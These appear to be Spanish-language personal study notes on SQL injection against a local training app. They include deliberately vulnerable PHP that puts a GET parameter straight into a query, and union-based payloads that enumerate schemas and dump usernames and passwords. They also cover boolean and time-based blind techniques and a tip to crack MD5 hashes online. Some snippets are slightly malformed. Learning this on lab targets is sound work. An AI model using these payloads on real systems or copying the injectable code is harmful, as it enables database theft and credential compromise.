# SQLI

https://github.com/appsecco/sqlinjection-training-app

en el caso de que tenga 32 caracteres una contraseña, probablemente sea md5 y en https://hashes.com/en/decrypt/hash puedes crackearla

```
<?php
        error_reporting(E_ALL);
        ini_set('display_errors', 1);   
        $server = "127.0.0.1"; 
        $username = "gopal";
        $password = "jorge123";
        $database = "gopal";
        

        $conn = new mysqli($server, $username, $password, $database);
        $id = $_GET['id'];
        
        $data = mysqli_query($conn, "select username from users where id = '$id'") or die(mysqli_error($conn));
        $response = mysqli_fetch_array($data);

        echo $response['username'];
?>

```

queremos mandar una solicitud GET mediante la url tal que así

```
http://localhost/conexion.php?id=1
```

con esta inyeccion podemos fuzzear cuantas columnas te reporta mysql

```
http://localhost/conexion.php?id=3' order by 100-- -
```

e ir cambiando el numero 100 hasta dar con las columnas correspondientes que te arroja la db

para saber el numero de columnas podemos hacer

```
http://localhost/conexion.php?id=3' union select 1,2-- -
```

al poner 1,2 si nos arroja un error, entonces es que no tiene 2 columnas (en este caso solo tiene una)

debido a esta capacidad de inyeccion de comandos podriamos mostrar por ejemplo el nombre de la base de datos

```
http://localhost/conexion.php?id=121212' union select database()-- -
```

```
http://localhost/conexion.php?id=121212' union select schema_name from information_schema.schemata limit 0,1-- -
```

```
http://localhost/conexion.php?id=121212' union select schema_name from information_schema.schemata limit 0,1-- -
```

en el caso de que haya multiples bases de datos en el servidor podriamos usar esta query y en el caso de querer mostrar otras bases de datos podriamos jugar con el parametro limit por ejemplo:

```
http://localhost/conexion.php?id=121212' union select group_concat(table_name) from information_schema.tables where table_schema='gopal'-- -
```

en este caso nos mostraria las tablas que tiene la base de datos gopal, que en este caso da como output users. jugando con group concat no tendriamos que hacer uso de limit y nos mostraría todos los campos dispnibles

```
http://localhost/conexion.php?id=121212' union select group_concat(column_name) from information_schema.columns where table_schema='gopal' and table_name='users'-- -
```

en este caso nos dará las columnas de la tabla users.

```
http://localhost/conexion.php?id=121212' union select group_concat(username) from users-- -
```

nos muestra unicamente los usuarios de una tabla

```
http://localhost/conexion.php?id=121212' union select group_concat(username,' ',password) from users-- -
```

en este caso nos mostraria el usuario un espacio y la contraseña

```
http://localhost/conexion.php?id=1' and sleep(5)-- -
```

en el caso de que no nos muestre el error, con un sleep 5 podemos también ver si la pagina esta repsondiendo a nuestro input

\==boolean based sqli==

!\[\[Pasted image 20251006161844.png]]

```
select (ascii substring(username,1,1) from users where id='1') = 'letra' 
```

```
(ascii substring(username,1,1))
```

esto nos dará el primer caracter de la cadena username

para bypassear el uso de las comillas podemos jugar con ascii para que nos representa la letra como hexadecimal y despues igualar la sentecia con el numero

podemos hacer un

```
curl -x -s -I GET "http://localhost/conexion.php" -G --data-urlencode "id=2 or 1=1"
```

y de esta manera podemos la cabecera resultante.

también podemos jugar con estos condicionales para saber cuando es correcto el input y cuando no es correcto y en el caso de tener una bind sqlinjection podemos saber el usuario jugando con el estado de la peticion http

!\[\[Pasted image 20251006165014.png]] !\[\[Pasted image 20251006164903.png]]

para las bind sqli basadas en tiempo

!\[\[Pasted image 20251006165342.png]]

en el caso de que el primer caracter sea una a entonces que haga un sleep(5), y como vemos no ha tardado 5 segundos porque es una H

para no hacer uso de comillas, podemos jugar de nuevo con ascii

!\[\[Pasted image 20251006165609.png]]

72 es una H mayuscula, y como vemos ahi si que tarda 5 segundos en responder

!\[\[Pasted image 20251006165826.png]]

!\[\[Pasted image 20251006165954.png]]

para sacar el usuario y contraseña en este caso
